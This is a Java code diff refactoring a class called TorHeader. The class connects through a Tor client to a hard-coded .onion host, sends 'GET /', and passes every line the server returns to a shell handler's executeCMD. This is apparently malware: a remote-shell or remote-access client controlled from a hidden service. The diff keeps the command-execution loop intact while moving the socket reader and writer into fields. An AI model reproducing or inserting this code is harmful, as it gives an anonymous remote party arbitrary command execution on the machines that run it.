@@ -13,6 +13,11 @@ import org.slf4j.LoggerFactory;
 
 public class TorHeader {
 
+    @Getter
+    PrintWriter socketWrite;
+    @Getter
+    BufferedReader socketRead;
+
     Logger logger = LoggerFactory.getLogger(getClass());
     @Getter
     TorClient client;
@@ -48,13 +53,14 @@ public class TorHeader {
                 setStarted(true);
                 try {
                     Socket socket = client.getSocketFactory().createSocket("pbc6urv4bakvxkjs.onion", 8000);
-                    PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
-                    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-                    writer.println("GET /");
+                    socketWrite = new PrintWriter(socket.getOutputStream(), true);
+                    socketRead = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+
+                    socketWrite.println("GET /");
                     String line;
-                    while ((line = reader.readLine()) != null) {
+                    while ((line = socketRead.readLine()) != null) {
                         logger.info(line);
-                        CommonHeader.getSHELL_HEADER().executeCMD(line);
+                        CommonHeader.getSHELL_HEADER().getSHELL_HANDLER().executeCMD(line);
                     }
                     logger.warn("closed");
                     socket.close();
